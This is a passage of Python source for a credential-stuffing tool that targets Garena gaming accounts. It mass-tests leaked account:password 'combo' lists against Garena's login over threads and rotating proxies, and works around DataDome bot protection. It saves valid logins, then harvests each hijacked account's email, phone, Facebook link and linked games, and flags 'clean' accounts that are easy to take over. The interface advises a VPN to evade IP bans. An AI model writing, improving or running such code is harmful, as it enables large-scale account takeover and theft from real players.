            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
            
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
            
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
    
    return (None, None, None)

def validator_check():
    clear_screen()
    display_banner()
    console = Console()
    
    console.print(Panel(Text("⚠  SECURITY NOTICE", style="bold bright_red") + Text(" — USE A VPN BEFORE VALIDATING", style="bright_white") + Text("\n   ExpressVPN or any VPN recommended to avoid IP bans", style="dim"), border_style="bright_red", box=box.ROUNDED, expand=False))
    print()
    console.print(Panel(Text("⬡  VALIDATOR MODE", style="bold bright_white") + Text(" — login-only, no game data fetched", style="dim") + Text("\n   Results → Results/validator_*/", style="dim"), border_style="bright_yellow", box=box.ROUNDED, expand=False))
    print()
    
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', 'No .txt files found in Combo folder.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer = AccountFileViewer()
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    
    accounts = []
    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as fh:
        for line in fh:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))
    
    if not accounts:
        _log('ERROR', 'No valid account:password lines found.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    console.print(Panel(Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"), border_style="bright_green", box=box.ROUNDED, expand=False))
    print()
    
    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="bright_cyan", box=box.ROUNDED, expand=False))
    
    while True:
        try:
            raw_t = input(f'  {_CY}❯ Threads 1-20 {_DIM}(default {DEFAULT_THREADS}){_RST}  {_CY}❯{_RST} ').strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 20:
                break
            _log('ERROR', 'Enter a value between 1 and 20.')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()
    
    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_dir = Path('Results') / f'validator_{stem}_{ts_str}'
    out_dir.mkdir(parents=True, exist_ok=True)
    
    valid_path = out_dir / 'valid.txt'
    invalid_path = out_dir / 'invalid.txt'
    error_path = out_dir / 'errors.txt'
    
    valid_fh = open(valid_path, 'a', encoding='utf-8', buffering=1)
    invalid_fh = open(invalid_path, 'a', encoding='utf-8', buffering=1)
    error_fh = open(error_path, 'a', encoding='utf-8', buffering=1)
    
    vl = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    print_lock = threading.Lock()
    start_time = time.time()
    total = len(accounts)
    cookie_manager_val = CookieManager()
    _tl = threading.local()

    def _get_sess():
        if not hasattr(_tl, 's'):
            s = requests.Session()
            dm = DataDomeManager()
            cks = cookie_manager_val.get_valid_cookies()
            if cks:
                applyck(s, '; '.join(cks))
                for part in cks[-1].split(';'):
                    part = part.strip()
                    if part.startswith('datadome='):
                        dm.set_datadome(part.split('=', 1)[1].strip())
                        break
            else:
                proxy_dict = dict(s.proxies) if s.proxies else None
                dd = get_datadome_cookie(s, proxies=proxy_dict)
                if dd:
                    dm.set_datadome(dd)
                    s.cookies.set('datadome', dd, domain='.garena.com')
            _tl.s = s
            _tl.dm = dm
        return (_tl.s, _tl.dm)

    def _print_line(tag, account, password, note=''):
        with print_lock:
            if tag == 'valid':
                console.print(f"  [bold bright_green]VALID  [/bold bright_green]  [bright_white]{account}:{password}[/bright_white]")
            else:
                reason = note.upper() if note else 'INCORRECT PASSWORD' if tag == 'invalid' else 'UNKNOWN ERROR'
                color = "bold bright_red" if tag == 'invalid' else "dim"
                console.print(f"  [{color}]INVALID[/{color}]  [dim]{account}:{password}[/dim]  [dim]{reason}[/dim]")

    def _print_live_stats():
        with st_lock:
            v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']
        elapsed = max(time.time() - start_time, 0.001)
        rate = dn / elapsed
        eta = (total - dn) / rate if rate > 0 else 0
        pct = dn / total * 100 if total > 0 else 0
        bar_w = 20
        filled = int(pct / 100 * bar_w)
        with print_lock:
            console.print()
            console.print(Panel(
                f"[bright_cyan]{'█' * filled}{'░' * (bar_w - filled)}[/bright_cyan]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{dn}/{total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
                border_style="bright_cyan", box=box.ROUNDED, padding=(0, 1), expand=False
            ))
            console.print()

    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        result = 'error'; note = ''
        try:
            session, dm = _get_sess()
            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
            if not v1 or not v2:
                result = 'invalid'; note = 'Account Not Found'
            else:
                sso_key = login(session, account, password, v1, v2)
                if sso_key:
                    result = 'valid'
                else:
                    result = 'invalid'; note = 'Incorrect Password'
        except Exception as e:
            result = 'error'; note = type(e).__name__
        with file_lock:
            if result == 'valid':
                valid_fh.write(f'{account}:{password}\n')
            elif result == 'invalid':
                invalid_fh.write(f'{account}:{password}\n')
            else:
                error_fh.write(f'{account}:{password}  | {note}\n')
        with st_lock:
            vl[result] += 1
            vl['done'] += 1
            done_now = vl['done']
        _print_line(result, account, password, note)
        if done_now % 5 == 0 or done_now == total:
            _print_live_stats()
    
    console.print(Panel(Text(f"Output: {out_dir}", style="bright_cyan"), border_style="bright_cyan", box=box.ROUNDED, expand=False))
    print()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except Exception:
                    pass
    except KeyboardInterrupt:
        stop_ev.set()
        _log('WARNING', 'Stopping — flushing results…')
    finally:
        valid_fh.close(); invalid_fh.close(); error_fh.close()
    
    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']

    def _rich_bar(cnt, denom, color, bw=20):
        if denom == 0:
            return f"[dim]{'░' * bw}[/dim]"
        f2 = int(cnt / denom * bw)
        return f"[{color}]{'█' * f2}[/{color}][dim]{'░' * (bw - f2)}[/dim]"
    
    results_table = Table(title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]", box=box.HEAVY, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
    results_table.add_column("Category", style="dim", no_wrap=True, width=14)
    results_table.add_column("Count", justify="right", style="bright_white", width=10)
    results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
    results_table.add_column("Bar", no_wrap=True)
    
    for label, cnt, color in [('✔  Valid', v, "bright_green"), ('✖  Invalid', iv, "bright_red"), ('·  Errors', er, "dim")]:
        pct_s = f'{cnt / total * 100:.1f}%' if total else '0.0%'
        results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{cnt:,}[/{color}]", pct_s, _rich_bar(cnt, total, color))
    
    console.print(results_table)
    print()
    
    stats_panel = Panel(
        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim") +
        Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim") +
        Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim") +
        Text(f"✔  Valid    {valid_path}\n", style="bright_cyan") +
        Text(f"✖  Invalid  {invalid_path}\n", style="bright_cyan") +
        Text(f"·  Errors   {error_path}\n", style="bright_cyan") +
        Text("⬡  Powered by @Markdev", style="bold bright_magenta"),
        border_style="bright_magenta", box=box.ROUNDED, expand=False
    )
    console.print(stats_panel)
    print()
    input(f'  {_DIM}Press Enter to return to menu{_RST} ')

def prompt_proxy_setup():
    global proxy_manager
    indent = "    "
    clear_screen()
    display_banner()

    def _header(title, subtitle=None):
        console.print(Panel(
            Text(title, style="bold bright_white") if not subtitle
            else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
            border_style="bright_magenta", box=box.ROUNDED, expand=False
        ))
        print()

    def _panel(content, border="bright_cyan"):
        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
        print()

    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
    def _info(msg): console.print(indent + f"  [bold bright_cyan]{msg}[/bold bright_cyan]")
    def _ask(prompt, color="bold bright_cyan"):
        return console.input(indent + f"[{color}]  ❯ {prompt}[/{color}]").strip()

    _header("PROXY CONFIGURATION", "Configure how requests are routed")

    mode_text = (
        Text("  [1]  ", style="bold bright_cyan") + Text("Custom URL", style="bold white") +
        Text("   – Single proxy, enter manually\n", style="dim") +
        Text("  [2]  ", style="bold bright_cyan") + Text("Proxy File", style="bold white") +
        Text("   – Load multiple proxies from a file\n", style="dim") +
        Text("  [3]  ", style="bold bright_cyan") + Text("No Proxy  ", style="bold white") +
        Text("   – Direct connection, no routing", style="dim")
    )
    _panel(mode_text)

    while True:
        choice = _ask("Select mode (1-3): ")
        if choice in ("1", "2", "3"):
            break
        _err("Invalid choice. Enter 1, 2, or 3.")
    print()

    if choice == "1":
        fmt_text = (
            Text("Enter a proxy URL in any format.\n\n", style="bold bright_white") +
            Text("  Supported protocols:\n", style="dim") +
            Text("  HTTP    ", style="bold cyan") + Text("– standard proxy, most compatible\n", style="dim") +
            Text("  HTTPS   ", style="bold cyan") + Text("– encrypted tunnel to proxy server\n", style="dim") +
            Text("  SOCKS5  ", style="bold cyan") + Text("– lower level, faster, supports UDP\n", style="dim") +
            Text("  SOCKS4  ", style="bold cyan") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
            Text("  Accepted formats:\n", style="dim") +
            Text("  http://user:pass@host:port      ", style="cyan") + Text("← standard URL\n", style="dim") +
            Text("  socks5://user:pass@host:port    ", style="cyan") + Text("← SOCKS5 with auth\n", style="dim") +
            Text("  host:port:user:pass             ", style="cyan") + Text("← colon-separated\n", style="dim") +
            Text("  user:pass@host:port             ", style="cyan") + Text("← auth prefix\n", style="dim") +
            Text("  host:port                       ", style="cyan") + Text("← no auth\n\n", style="dim") +
            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="cyan") +
            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="cyan") +
            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.", style="cyan")
        )
        _panel(fmt_text)

        url_input = _ask("Proxy URL (Enter to skip): ")
        print()

        if not url_input:
            proxy_manager = ProxyManager(enabled=False)
            _warn("No URL entered. Proxies disabled.")
        else:
            normalised = _parse_proxy_line(url_input)
            if not normalised:
                _err("Could not parse that format. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Test this proxy before using it?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – verify connectivity and IP\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (Y/n): ").lower()

                if do_validate in ("", "y", "yes"):
                    print()
                    _info("🔍 Testing proxy…")
                    ok, info, lat = _validate_proxy(normalised)
                    _close_check_session()
                    print()
                    if ok:
                        _ok(f"Proxy live.  IP: [cyan]{info}[/cyan]")
                        _display_proxy_quality(1, 1, lat, indent)
                        proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    else:
                        _err(f"Validation failed: [yellow]{info}[/yellow]")
                        hint_map = {
                            "auth_failed(407)":   "407 – Credentials rejected. Check username and password.",
                            "auth_denied(403)":   "403 – Account suspended or IP not whitelisted.",
                            "auth_denied(401)":   "401 – Invalid credentials.",
                            "dns_fail":           "Cannot resolve hostname. Check the host in the URL.",
                            "connection_refused": "Connection refused. Wrong port or server is down.",
                            "connect_timeout":    "Timed out. Proxy may be overloaded or host is wrong.",
                        }
                        hint = next((v for k, v in hint_map.items() if info.startswith(k)),
                                    "Proxy unreachable or blocked the check endpoint.")
                        console.print(indent + f"  [dim]↳ {hint}[/dim]")
                        print()

                        force_text = (
                            Text("Proxy failed validation.\n\n", style="bold yellow") +
                            Text("  [Y]  ", style="bold yellow") + Text("Use it anyway\n", style="dim") +
                            Text("  [N]  ", style="bold red") + Text("Disable proxies", style="dim")
                        )
                        _panel(force_text, border="yellow")
                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()

                        if force in ("y", "yes"):
                            proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                            _warn("Proxy set (unvalidated).")
                        else:
                            proxy_manager = ProxyManager(enabled=False)
                            _warn("Proxies disabled.")
                else:
                    proxy_manager = ProxyManager(enabled=True, fallback_url=normalised)
                    _ok("Custom proxy set (validation skipped).")

    elif choice == "2":
        file_text = (
            Text("Enter path to a proxy file (one proxy per line).\n\n", style="bold bright_white") +
            Text("  Supported protocols:\n", style="dim") +
            Text("  HTTP    ", style="bold cyan") + Text("– standard proxy, most compatible\n", style="dim") +
            Text("  HTTPS   ", style="bold cyan") + Text("– encrypted tunnel to proxy server\n", style="dim") +
            Text("  SOCKS5  ", style="bold cyan") + Text("– lower level, faster, supports UDP\n", style="dim") +
            Text("  SOCKS4  ", style="bold cyan") + Text("– legacy, no auth, TCP only\n\n", style="dim") +
            Text("  Accepted formats:\n", style="dim") +
            Text("  http://user:pass@host:port      ", style="cyan") + Text("← standard URL\n", style="dim") +
            Text("  socks5://user:pass@host:port    ", style="cyan") + Text("← SOCKS5 with auth\n", style="dim") +
            Text("  host:port:user:pass             ", style="cyan") + Text("← colon-separated\n", style="dim") +
            Text("  user:pass@host:port             ", style="cyan") + Text("← auth prefix\n", style="dim") +
            Text("  host:port                       ", style="cyan") + Text("← no auth\n\n", style="dim") +
            Text("  File tips:\n", style="dim") +
            Text("  #                               ", style="cyan") + Text("← lines starting with # are skipped\n", style="dim") +
            Text("  Blank lines                     ", style="cyan") + Text("← ignored automatically\n", style="dim") +
            Text("  Mixed formats                   ", style="cyan") + Text("← each line parsed independently\n\n", style="dim") +
            Text("  No auth needed?  ", style="dim") + Text("Use host:port or http://host:port\n", style="cyan") +
            Text("  Residential?     ", style="dim") + Text("Prefer SOCKS5 for better compatibility.\n", style="cyan") +
            Text("  Datacenter?      ", style="dim") + Text("HTTP works fine for most cases.\n\n", style="cyan") +
            Text("  Default: ", style="dim") + Text("proxies.txt", style="bold cyan") + Text(" in the current folder.", style="dim")
        )
        _panel(file_text)

        file_input = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
        print()

        if not Path(file_input).is_file():
            _err(f"File not found: '{file_input}'. Proxies disabled.")
            proxy_manager = ProxyManager(enabled=False)
        else:
            raw_lines = Path(file_input).read_text(encoding="utf-8", errors="ignore").splitlines()
            parsed_urls, skipped = [], 0
            for line in raw_lines:
                url = _parse_proxy_line(line)
                if url:
                    parsed_urls.append(url)
                elif line.strip() and not line.strip().startswith("#"):
                    skipped += 1

            console.print(
                indent +
                f"  [bold bright_cyan]Loaded:[/bold bright_cyan]  "
                f"[green]{len(parsed_urls)} proxies[/green]  "
                f"[dim]│[/dim]  "
                f"[yellow]{skipped} lines skipped[/yellow]"
            )
            print()

            if not parsed_urls:
                _warn("No valid proxies found. Proxies disabled.")
                proxy_manager = ProxyManager(enabled=False)
            else:
                val_text = (
                    Text("Validate all proxies?\n\n", style="bold bright_white") +
                    Text("  [Y]  ", style="bold green") + Text("Yes – test each, keep only working ones\n", style="dim") +
                    Text("  [N]  ", style="bold yellow") + Text("No  – use all as-is", style="dim")
                )
                _panel(val_text)
                do_validate = _ask("Validate? (Y/n): ").lower()

                if do_validate in ("", "y", "yes"):
                    print()
                    speed_text = (
                        Text("Select validation speed.\n\n", style="bold bright_white") +
                        Text("  [1]  ", style="bold bright_cyan") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
                        Text("  [2]  ", style="bold bright_cyan") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
                        Text("  [3]  ", style="bold bright_cyan") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
                        Text("  [4]  ", style="bold bright_cyan") + Text("Slow    ", style="bold white") + Text("  50 threads, 10s timeout – low-end PC", style="dim")
                    )
                    _panel(speed_text)
                    speed_choice = _ask("Speed (1-4, Enter = Fast): ")
                    workers, timeout = {"1": (1000, 4.0), "2": (500, 5.0), "3": (200, 7.0), "4": (50, 10.0)}.get(speed_choice, (500, 5.0))
                    print()

                    console.print(
                        indent +
                        f"  [bold bright_cyan]Validating:[/bold bright_cyan]  "
                        f"[yellow]{len(parsed_urls):,} proxies[/yellow]  "
                        f"[dim]│[/dim]  [cyan]{workers} threads[/cyan]  "
                        f"[dim]│  {timeout}s timeout[/dim]"
                    )
                    print()

                    valid_urls = _validate_proxies_bulk(parsed_urls, timeout=timeout, max_workers=workers, indent=indent)
                    _close_check_session()
                    print()

                    if not valid_urls:
                        _err("No proxies passed validation. Proxies disabled.")
                        proxy_manager = ProxyManager(enabled=False)
                    else:
                        save_text = (
                            Text("Save working proxies back to file?\n\n", style="bold bright_white") +
                            Text("  [Y]  ", style="bold green") + Text("Yes – overwrite file with working proxies only\n", style="dim") +
                            Text("  [N]  ", style="bold yellow") + Text("No  – use working proxies this session only", style="dim")
                        )
                        _panel(save_text)
                        save_back = _ask("Save back? (Y/n): ").lower()

                        if save_back in ("", "y", "yes"):
                            try:
                                Path(file_input).write_text("\n".join(valid_urls) + "\n", encoding="utf-8")
                                _ok(f"Saved [cyan]{len(valid_urls)}[/cyan] proxies to '[cyan]{file_input}[/cyan]'.")
                            except Exception as e:
                                _warn(f"Could not write file: {e}")

                        proxy_manager = ProxyManager(enabled=True)
                        proxy_manager.proxies = valid_urls
                        _ok(f"Loaded [cyan]{len(valid_urls)}[/cyan] validated proxies.")
                else:
                    proxy_manager = ProxyManager(enabled=True)
                    proxy_manager.proxies = parsed_urls
                    _ok(f"Loaded [cyan]{len(parsed_urls)}[/cyan] proxies (validation skipped).")

    else:
        proxy_manager = ProxyManager(enabled=False)
        _warn("Proxies disabled. Running direct.")

    _close_check_session()
    print()
    input(indent + "Press Enter to continue...")

def parse_game_selection(input_str: str) -> list[dict]:
    queries = []
    
    game_map = {
        'rov': ['ROV'],
        'freefire': ['FREEFIRE'],
        'free fire': ['FREEFIRE'],
        'codm': ['CODM'],
        'deltaforce': ['DELTA FORCE'],
        'delta force': ['DELTA FORCE'],
        'aov': ['AOV'],
        'speeddrifters': ['SPEED DRIFTERS'],
        'speed drifter': ['SPEED DRIFTERS'],
        'blackclover': ['BLACK CLOVER M'],
        'black clover': ['BLACK CLOVER M'],
        'undawn': ['GARENA UNDAWN'],
        'fconline': ['FC ONLINE'],
        'fc online': ['FC ONLINE'],
        'fconlinem': ['FC ONLINE M'],
        'fc online m': ['FC ONLINE M'],
        'worldofwar': ['THE WORLD OF WAR'],
        'world of war': ['THE WORLD OF WAR'],
        'moonlightblade': ['MOONLIGHT BLADE'],
        'moonlight blade': ['MOONLIGHT BLADE'],
    }
    
    region_map = {
        'sg': 'SG',
        'ph': 'PH',
        'my': 'MY',
        'th': 'TH',
        'id': 'ID',
        'in': 'IN',
        'vn': 'VN',
        'tw': 'TW',
    }
    
    if not input_str.strip():
        return [{'game': '*', 'region': '*', 'display': 'ALL GAMES (ALL)'}]
    
    parts = [p.strip() for p in input_str.split(',')]
    for part in parts:
        words = part.lower().split()
        
        game_name = None
        region = None
        
        for word in words:
            if word in region_map:
                region = region_map[word]
                break
        
        for word in words:
            if word in game_map:
                game_name = word
                break
        
        if not game_name:
            for gname, game_names in game_map.items():
                for word in words:
                    if word in gname or gname in word:
                        game_name = gname
                        break
                if game_name:
                    break
        
        if game_name:
            queries.append({
                'game': game_map[game_name],
                'region': region or '*',
                'display': f"{game_name.upper()} ({region or 'ALL'})"
            })
        else:
            queries.append({
                'game': '*',
                'region': region or '*',
                'display': f"ALL GAMES ({region or 'ALL'})"
            })
    
    return queries

def filter_game_connections(connections: list[dict], queries: list[dict]) -> list[dict]:
    if not connections:
        return []
    
    if any(q.get('game') == '*' and q.get('region') == '*' for q in queries):
        return connections
    
    filtered = []
    for conn in connections:
        conn_game = conn.get('game', '').upper()
        conn_region = conn.get('region', '').upper()
        
        for query in queries:
            q_games = query.get('game', [])
            q_region = query.get('region', '').upper()
            
            game_match = (q_games == '*')
            if not game_match:
                if isinstance(q_games, list):
                    game_match = any(conn_game == g or g in conn_game or conn_game in g for g in q_games)
                else:
                    game_match = conn_game == q_games or q_games in conn_game or conn_game in q_games
            
            region_match = (q_region == '*') or (q_region == conn_region)
            
            if game_match and region_match:
                filtered.append(conn)
                break
    
    return filtered

def get_account_details_full(session):
    details = {
        'username': 'N/A',
        'email': 'N/A',
        'mobile_no': 'N/A',
        'shell': 0,
        'is_clean': False,
        'uid': 'N/A',
        'nickname': 'N/A',
        'country': 'N/A',
        'fb_username': 'N/A',
        'fb_info': 'N/A',
        'email_verified': False,
        'mobile_bound': False
    }
    
    try:
        cookie_parts = []
        for k in ['apple_state_key', 'datadome', 'sso_key']:
            if session.cookies.get(k):
                cookie_parts.append(f'{k}={session.cookies.get(k)}')
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        if cookie_header:
            headers['cookie'] = cookie_header
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
        
        if response.status_code == 200:
            data = response.json()
            user_info = data.get('user_info', {})
            
            details['username'] = user_info.get('username', 'N/A')
            details['uid'] = user_info.get('uid', 'N/A')
            details['nickname'] = user_info.get('nickname', 'N/A')
            details['email'] = user_info.get('email', 'N/A')
            details['shell'] = user_info.get('shell', 0)
            details['country'] = user_info.get('acc_country', 'N/A')
            
            mobile = user_info.get('mobile_no', 'N/A')
            details['mobile_no'] = mobile if mobile and mobile != 'N/A' else 'N/A'
            
            email_verified = user_info.get('email_v', 0)
            details['email_verified'] = bool(email_verified)
            
            mobile_bound = user_info.get('mobile_binding_status', 0)
            details['mobile_bound'] = bool(mobile_bound)
            
            is_clean = (mobile == 'N/A' or not mobile or str(mobile).strip() == '') and email_verified == 0
            details['is_clean'] = is_clean
            
            fb_account = user_info.get('fb_account', {})
            if fb_account:
                fb_uid = fb_account.get('fb_uid', 'N/A')
                fb_username = fb_account.get('fb_username', 'N/A')
                if fb_uid and fb_uid != 'N/A':
                    details['fb_username'] = fb_username if fb_username and fb_username != 'N/A' else 'N/A'
                    details['fb_info'] = 'CONNECTED'
                else:
                    details['fb_info'] = 'NOT CONNECTED'
            else:
                details['fb_info'] = 'NOT CONNECTED'
                
    except Exception:
        pass
    
    return details

def hunter_process(account, password, cookie_manager, queries):
    session = requests.Session()
    datadome_manager = DataDomeManager()
    
    try:
        valid_cookies = cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined = '; '.join(valid_cookies)
            applyck(session, combined)
            for part in valid_cookies[-1].split(';'):
                part = part.strip()
                if part.startswith('datadome='):
                    datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                    break
        
        if not datadome_manager.get_datadome():
            dd = get_datadome_cookie(session)
            if dd:
                datadome_manager.set_datadome(dd)
                datadome_manager.set_session_datadome(session, dd)
        
        v1, v2, _ = _prelogin_no_ip_wait(session, account, datadome_manager)
        if not v1 or not v2:
            return 'invalid', "Account Not Found"
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            return 'invalid', "Incorrect Password"
        
        if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
            return 'invalid', sso_key.split(':', 1)[1]
        
        account_details = get_account_details_full(session)
        
        all_connections = get_game_connections(session, account)
        
        filtered_connections = filter_game_connections(all_connections, queries)
        
        if filtered_connections:
            connection_details = []
            for conn in filtered_connections:
                detail = {
                    'game': conn.get('game', 'Unknown'),
                    'region': conn.get('region', 'Unknown'),
                    'role': conn.get('role', 'N/A'),
                    'app_id': conn.get('app_id', 'N/A'),
                    'username': account_details.get('username', 'N/A'),
                    'email': account_details.get('email', 'N/A'),
                    'mobile_no': account_details.get('mobile_no', 'N/A'),
                    'shell': account_details.get('shell', 0),
                    'is_clean': account_details.get('is_clean', False),
                    'uid': account_details.get('uid', 'N/A'),
                    'nickname': account_details.get('nickname', 'N/A'),
                    'country': account_details.get('country', 'N/A'),
                    'fb_username': account_details.get('fb_username', 'N/A'),
                    'fb_info': account_details.get('fb_info', 'N/A')
                }
                for key, value in conn.items():
                    if key not in ['game', 'region', 'role', 'app_id']:
                        detail[key] = value
                connection_details.append(detail)
            
            return 'valid_with_games', connection_details
        else:
            return 'valid_no_games', all_connections
            
    except Exception as e:
        return 'error', str(e)
    finally:
        try:
            session.close()
        except:
            pass

def game_connections_hunter():
    clear_screen()
    display_banner()
    console = Console()
    
    console.print(Panel(
        Text("⚠  SECURITY NOTICE", style="bold bright_red") + 
        Text(" — USE A VPN BEFORE SCANNING", style="bright_white"),
        border_style="bright_red",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    
    games_display = Table(show_header=False, box=ROUNDED, border_style="bright_cyan", padding=(0, 1), expand=False)
    games_display.add_column(style="dim", width=20)
    games_display.add_column(style="bright_white")
    
    game_examples = [
        ("CODM", "codm sg, codm ph"),
        ("ROV", "rov th, rov id"),
        ("Free Fire", "freefire ph, freefire th"),
        ("Delta Force", "deltaforce sg"),
        ("AOV", "aov vn"),
        ("FC Online", "fconline th"),
        ("Multiple", "rov th, freefire id, codm sg"),
        ("All Games", "just press Enter"),
    ]
    
    games_display.add_row("[dim]📌 Examples[/dim]", "")
    for display, example in game_examples:
        games_display.add_row(f"  [cyan]{display}[/cyan]", f"[dim]{example}[/dim]")
    
    console.print(Panel(
        games_display,
        title="[bold bright_white]AVAILABLE GAMES[/bold bright_white]",
        border_style="bright_cyan",
        box=ROUNDED,
        padding=(0, 1),
        expand=False
    ))
    print()
    
    console.print(Panel(
        Text("Enter games and regions to check", style="bold bright_white") +
        Text("\nFormat: game region, game region", style="dim") +
        Text("\nExample: rov th, codm ph, freefire id", style="dim") +
        Text("\nPress Enter for ALL games in ALL regions", style="dim"),
        border_style="bright_yellow",
        box=ROUNDED,
        expand=False
    ))
    
    game_input = input(f'\n  {_CY}❯ Game selection{_RST}  {_CY}❯{_RST} ').strip()
    queries = parse_game_selection(game_input)
    
    console.print()
    console.print(Panel(
        Text("Selected: ", style="dim") + Text(", ".join(q['display'] for q in queries), style="bright_cyan"),
        border_style="bright_green",
        box=ROUNDED,
        expand=False
    ))
    print()
    
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', 'No .txt files found in Combo folder.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer = AccountFileViewer()
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    
    if file_viewer.prompt_clean_file():
        with console.status('[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]', spinner='dots'):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
    
    if file_viewer.prompt_remove_duplicates():
        with console.status('[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]', spinner='dots'):
            removed = file_manager.clean_duplicates(selected_file)
        _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
    
    accounts = []
    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))
    
    if not accounts:
        _log('ERROR', 'No valid accounts found.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    console.print(Panel(
        Text(f"Loaded {len(accounts):,} accounts", style="bold bright_white"),
        border_style="bright_green",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    
    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="bright_cyan", box=box.ROUNDED, expand=False))
    while True:
        try:
            raw_t = input(f'  {_CY}❯ Threads 1-20 {_DIM}(default 5){_RST}  {_CY}❯{_RST} ').strip()
            num_threads = int(raw_t) if raw_t else 5
            if 1 <= num_threads <= 20:
                break
            _log('ERROR', 'Enter a value between 1 and 20.')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()
    
    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_dir = Path('Results') / f'game_hunter_{stem}_{ts_str}'
